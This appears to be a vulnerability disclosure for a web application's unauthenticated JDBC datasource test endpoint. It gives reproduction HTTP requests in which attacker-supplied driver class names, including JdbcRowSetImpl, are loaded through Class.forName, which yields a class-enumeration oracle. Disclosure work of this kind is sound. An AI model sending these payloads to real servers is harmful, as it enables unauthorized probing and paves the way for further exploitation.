Vulnerability Title: Unauthorized JDBC Arbitrary Driver Injection

Unauthorized Reachability + Arbitrary Class Loading in Oracle

Vulnerability Reproduction

``http POST /magic/web/datasource/jdbc/test HTTP/1.1
Host: 192.168.26.129:9999
Content-Type: application/json

```
(This controller has no `@Valid`, and no credentials are used throughout the process)

**Testing A: Driver class not found**

```json

{"driverClassName":"com.example.NoSuchDriver","url":"jdbc:mariadb://127.0.0.1:3306/x","username":"a","password":"b"}
``` Returns:

```json

{"code":1,"message":"success","data":"Driver not found: com.example.NoSuchDriver","timestamp":1791888481761,"executeTime":null}

```

**Test E: Any JDK class (non-driver) can also be used with `Class.forName` Loading**

```json

{"driverClassName":"com.sun.rowset.JdbcRowSetImpl","url":"jdbc:foo:x","username":"a","password":"b"}
``` Returns:

``json

{"code":1,"message":"success","data":"Failed to obtain JDBC connection: No suitable driver found for jdbc:foo:x","timestamp":1791888482048,"executeTime":null}

``` Explanation: `Class.forName(attacker input)` successfully loaded an arbitrary class (class loading/class initialization oracle, can enumerate the existence of any class in the target classpath; `JdbcRowSetImpl` was only loaded, JNDI was not triggered, the "LDAP probe" report from POC C is invalid in this environment).

